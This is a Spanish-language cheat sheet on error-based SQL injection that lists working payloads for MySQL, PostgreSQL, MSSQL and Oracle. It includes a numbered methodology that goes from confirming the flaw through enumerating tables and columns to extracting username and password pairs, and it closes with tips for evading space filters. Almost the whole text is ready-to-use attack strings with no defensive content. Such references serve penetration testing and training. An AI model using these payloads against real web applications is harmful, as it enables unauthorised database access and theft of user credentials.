# Error based SQLI

Aprovecha los mensajes de error de la base de datos que se muestran en la respuesta HTTP para extraer información directamente. Es la técnica más rápida cuando los errores son visibles.

**Flujo:**

```
Payload malicioso → Error SQL generado → Error visible en respuesta → Datos extraídos del mensaje
```

### MySQL&#x20;

### Funciones principales

| Función                       | Uso                                  |
| ----------------------------- | ------------------------------------ |
| `extractvalue()`              | Extrae datos mediante XPath          |
| `updatexml()`                 | Modifica XML, genera error con datos |
| `floor() + rand() + group by` | Error de duplicado con datos         |

#### extractvalue()

```sql
-- Sintaxis base
' AND extractvalue(1, concat(0x7e, (PAYLOAD), 0x7e)) -- -

-- Versión
' AND extractvalue(1, concat(0x7e, version(), 0x7e)) -- -

-- Base de datos actual
' AND extractvalue(1, concat(0x7e, database(), 0x7e)) -- -

-- Tablas
' AND extractvalue(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)) -- -

-- Columnas de una tabla
' AND extractvalue(1, concat(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1), 0x7e)) -- -

-- Datos de una columna
' AND extractvalue(1, concat(0x7e, (SELECT username FROM users LIMIT 0,1), 0x7e)) -- -
```

> `extractvalue()` solo muestra los primeros **32 caracteres**. Para strings más largos usar `substring()`.

```sql
-- Datos largos con substring
' AND extractvalue(1, concat(0x7e, substring((SELECT password FROM users LIMIT 0,1), 1, 30), 0x7e)) -- -
' AND extractvalue(1, concat(0x7e, substring((SELECT password FROM users LIMIT 0,1), 31, 30), 0x7e)) -- -
```

#### updatexml()

```sql
-- Sintaxis base
' AND updatexml(1, concat(0x7e, (PAYLOAD), 0x7e), 1) -- -

-- Versión
' AND updatexml(1, concat(0x7e, version(), 0x7e), 1) -- -

-- Base de datos
' AND updatexml(1, concat(0x7e, database(), 0x7e), 1) -- -

-- Tablas
' AND updatexml(1, concat(0x7e, (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()), 0x7e), 1) -- -

-- Datos
' AND updatexml(1, concat(0x7e, (SELECT concat(username,':',password) FROM users LIMIT 0,1), 0x7e), 1) -- -
```

#### floor() + rand() + group by

```sql
-- Payload clásico
' AND (SELECT 1 FROM (SELECT COUNT(*), concat((PAYLOAD), floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a) -- -

-- Con versión
' AND (SELECT 1 FROM (SELECT COUNT(*), concat(version(), floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a) -- -

-- Con datos de usuario
' AND (SELECT 1 FROM (SELECT COUNT(*), concat((SELECT concat(username,0x3a,password) FROM users LIMIT 0,1), floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a) -- -
```

### PostgreSQL — Error-Based

```sql
-- cast() para generar error de tipo
' AND cast((SELECT version()) AS int) -- -

-- Operación inválida
' AND 1=cast((SELECT username FROM users LIMIT 1) AS int) -- -

-- pg_sleep combinado con error (alternativa)
'; SELECT * FROM pg_sleep(0) WHERE 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1) AS int) -- -
```

### MSSQL — Error-Based

```sql
-- convert() para error de tipo
' AND convert(int, (SELECT @@version)) -- -
' AND convert(int, (SELECT TOP 1 table_name FROM information_schema.tables)) -- -
' AND convert(int, (SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users')) -- -
' AND convert(int, (SELECT TOP 1 password FROM users)) -- -

-- cast() equivalente
' AND cast((SELECT TOP 1 username FROM users) AS int) -- -
```

### Oracle — Error-Based

```sql
-- XMLType para error visible
' AND (SELECT upper(XMLType(chr(60)||chr(58)||(SELECT version FROM v$instance)||chr(62))) FROM dual) -- -

-- utl_inaddr (requiere permisos)
' AND utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE rownum=1)) -- -

-- CTXSYS.DRITHSX.SN (menos común)
' AND ctxsys.drithsx.sn(user,(SELECT banner FROM v$version WHERE rownum=1)) -- -
```

### Metodología

```
1. Confirmar inyección
   → Payload: '
   → Buscar: "syntax error", "mysql_fetch", "ORA-", "SQLSTATE"

2. Identificar DBMS
   → ' AND extractvalue(1,version()) -- -      (MySQL)
   → ' AND cast(version() as int) -- -         (PostgreSQL)
   → ' AND convert(int,@@version) -- -         (MSSQL)

3. Obtener base de datos actual
   → ' AND updatexml(1,concat(0x7e,database()),1) -- -

4. Enumerar tablas
   → ' AND updatexml(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())),1) -- -

5. Enumerar columnas
   → ' AND updatexml(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users')),1) -- -

6. Extraer datos
   → ' AND updatexml(1,concat(0x7e,(SELECT concat(username,0x3a,password) FROM users LIMIT 0,1)),1) -- -
   → Iterar con LIMIT 1,1 / 2,1 / 3,1 ...
```

### Tips

```sql
-- group_concat para obtener múltiples resultados en uno
SELECT group_concat(username ORDER BY username SEPARATOR ':') FROM users;

-- 0x7e es el carácter ~ (tilde), útil como delimitador visible en el error
-- 0x3a es ':' para separar usuario:contraseña

-- Si el input está en un contexto numérico (sin comillas):
1 AND extractvalue(1,concat(0x7e,database())) -- -

-- Si hay filtro de espacios, usar comentarios como separador:
'/**/AND/**/extractvalue(1,concat(0x7e,database()))-- -
```

> Si `group_concat` devuelve demasiados datos y se corta, ajustar con `group_concat_max_len` o filtrar con `WHERE`.

> Los errores de Oracle empiezan con `ORA-XXXXX`, los de MySQL con `You have an error...` o `XPATH syntax error`.
